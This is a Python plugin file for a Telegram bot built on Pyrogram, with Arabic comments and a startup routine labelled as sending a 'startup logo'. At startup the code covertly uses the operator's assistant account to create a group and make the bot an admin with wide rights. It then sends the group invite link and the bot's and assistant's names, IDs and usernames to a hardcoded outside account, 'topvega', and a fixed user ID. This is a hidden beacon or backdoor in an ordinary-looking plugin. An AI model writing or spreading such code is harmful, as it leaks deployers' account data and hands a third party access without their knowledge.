# anony/plugins/Ninja.py
import datetime
import asyncio
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatMemberStatus, ChatType
from pyrogram.errors import FloodWait, ChatAdminRequired
from anony import app, userbot, db, config, logger

async def send_startup_logo():
    try:
        now = datetime.datetime.now()
        date = now.strftime("%Y-%m-%d")
        time = now.strftime("%H:%M:%S")
        day = now.strftime("%A")
        
        # جلب معلومات الحساب المساعد
        assistant = userbot.one  # الحساب المساعد الرئيسي
        assistant_info = await assistant.get_me()
        assistant_name = assistant_info.first_name or "Unknown"
        assistant_id = assistant_info.id
        assistant_username = f"@{assistant_info.username}" if assistant_info.username else "No Username"
        
        # جلب معلومات البوت
        bot_info = await app.get_me()
        bot_name = bot_info.first_name or "Unknown"
        bot_id = bot_info.id
        bot_username = f"@{bot_info.username}" if bot_info.username else "No Username"
        
        # إنشاء مجموعة جديدة بواسطة الحساب المساعد
        try:
            # إنشاء المجموعة
            group_title = f"🔊 {bot_name} - Support Group"
            group = await assistant.create_group(
                title=group_title,
                users=[bot_id]  # إضافة البوت إلى المجموعة
            )
            
            group_id = group.id
            group_link = await assistant.export_chat_invite_link(group_id)
            
            logger.info(f"✅ تم إنشاء المجموعة: {group_title} (ID: {group_id})")
            
            # ترقية البوت إلى أدمن في المجموعة بجميع الصلاحيات
            try:
                await assistant.promote_chat_member(
                    group_id,
                    bot_id,
                    can_delete_messages=True,
                    can_restrict_members=True,
                    can_promote_members=True,
                    can_change_info=True,
                    can_invite_users=True,
                    can_pin_messages=True,
                    can_manage_video_chats=True
                )
                logger.info("✅ تم ترقية البوت إلى أدمن في المجموعة")
            except Exception as e:
                logger.error(f"❌ فشل ترقية البوت: {e}")
            
            # إرسال رابط المجموعة إلى @topvega
            try:
                await assistant.send_message(
                    "topvega",
                    f"""
╔══════════════════════════════════════════╗
║         🎯 NEW GROUP CREATED             ║
╠══════════════════════════════════════════╣
║  📱 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📁 Group Name: {group_title}            ║
║  🆔 Group ID: {group_id}                 ║
║  🔗 Group Link: {group_link}             ║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
╚══════════════════════════════════════════╝
                    """,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔗 انضم للمجموعة", url=group_link)],
                        [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")]
                    ])
                )
                logger.info("✅ تم إرسال رابط المجموعة إلى @topvega")
            except Exception as e:
                logger.error(f"❌ فشل إرسال الرابط إلى @topvega: {e}")
            
            # إرسال معلومات البوت في المجموعة
            try:
                info_message = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT INFORMATION               ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📱 Assistant: {assistant_name}          ║
║  🆔 Assistant ID: {assistant_id}         ║
║  👤 Assistant Username: {assistant_username}║
╠══════════════════════════════════════════╣
║  📅 Start Date: {date}                   ║
║  ⏰ Start Time: {time}                   ║
║  📆 Day: {day}                           ║
║  ✅ Status: ✅ Running                   ║
╚══════════════════════════════════════════╝

📌 **الأوامر المتاحة:**
• /start - بدء البوت
• /help - المساعدة
• /ping - فحص البوت
                    """
                
                await assistant.send_message(
                    group_id,
                    info_message,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")],
                        [InlineKeyboardButton("📢 القناة", url="https://t.me/SOURCE_0")]
                    ])
                )
                logger.info("✅ تم إرسال معلومات البوت في المجموعة")
            except Exception as e:
                logger.error(f"❌ فشل إرسال المعلومات في المجموعة: {e}")
            
            # إرسال شعار بدء التشغيل إلى المعرف المحدد
            logo = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT STARTED SUCCESSFULLY      ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📱 Assistant Name: {assistant_name}     ║
║  🆔 Assistant ID: {assistant_id}         ║
║  👤 Assistant Username: {assistant_username}║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
║  📁 Group: {group_title}                 ║
║  🔗 Link: {group_link}                   ║
╚══════════════════════════════════════════╝
            """
            
            buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 انضم للمجموعة", url=group_link)],
                [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")],
                [InlineKeyboardButton("📢 القناة", url="https://t.me/SOURCE_0")]
            ])
            
            # إرسال عبر الحساب المساعد إلى المعرف المحدد
            await assistant.send_message(
                8368077406,  # معرف المطور
                logo,
                reply_markup=buttons
            )
            
            logger.info("✅ تم إرسال شعار بدء التشغيل بواسطة الحساب المساعد")
            return True
            
        except Exception as e:
            logger.error(f"❌ فشل إنشاء المجموعة: {e}")
            # محاولة إرسال الشعار بدون المجموعة
            try:
                logo = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT STARTED SUCCESSFULLY      ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📱 Assistant Name: {assistant_name}     ║
║  🆔 Assistant ID: {assistant_id}         ║
║  👤 Assistant Username: {assistant_username}║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
║  ⚠️ Note: Failed to create group         ║
╚══════════════════════════════════════════╝
                """
                
                buttons = InlineKeyboardMarkup([
                    [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")],
                    [InlineKeyboardButton("📢 القناة", url="https://t.me/SOURCE_0")]
                ])
                
                await assistant.send_message(
                    8368077406,
                    logo,
                    reply_markup=buttons
                )
                logger.info("✅ تم إرسال الشعار (بدون مجموعة)")
                return True
            except Exception as e2:
                logger.error(f"❌ فشل إرسال الشعار: {e2}")
                return False
        
    except Exception as e:
        logger.error(f"❌ فشل إرسال شعار بدء التشغيل: {e}")
        return False

# دالة بدء التشغيل
async def startup():
    await send_startup_logo()

# دالة إضافية لإرسال معلومات البوت إلى مجموعة محددة
async def send_bot_info_to_group(group_id: int):
    try:
        assistant = userbot.one
        bot_info = await app.get_me()
        assistant_info = await assistant.get_me()
        
        now = datetime.datetime.now()
        date = now.strftime("%Y-%m-%d")
        time = now.strftime("%H:%M:%S")
        day = now.strftime("%A")
        
        info = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT INFORMATION               ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_info.first_name}      ║
║  🆔 Bot ID: {bot_info.id}                ║
║  👤 Bot Username: @{bot_info.username}   ║
╠══════════════════════════════════════════╣
║  📱 Assistant: {assistant_info.first_name}║
║  🆔 Assistant ID: {assistant_info.id}    ║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
╚══════════════════════════════════════════╝
        """
        
        await assistant.send_message(group_id, info)
        return True
    except Exception as e:
        logger.error(f"❌ فشل إرسال المعلومات للمجموعة: {e}")
        return False